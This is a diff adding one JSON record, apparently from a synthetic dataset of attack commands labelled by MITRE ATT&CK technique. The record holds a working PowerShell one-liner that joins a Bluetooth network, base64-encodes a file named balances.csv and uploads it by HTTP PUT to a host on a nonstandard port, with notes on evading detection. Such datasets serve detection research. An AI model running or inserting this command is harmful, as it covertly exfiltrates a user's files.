@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null",
+  "explanation": "Uses HTTP PUT to a custom port over a Bluetooth PAN-isolated subnet to exfiltrate base64 data, aligning with exfiltration over another network medium (T1011).",
+  "rationale_steps": [
+    "Establish Bluetooth PAN connectivity using a Bluetooth manipulation tool.",
+    "Assign a static /30 address to the Bluetooth interface with netsh.",
+    "Send base64 data using HTTP on a nonstandard port to reduce detection.",
+    "Destination IP is only reachable over Bluetooth, forcing that medium."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-92ef89c1",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
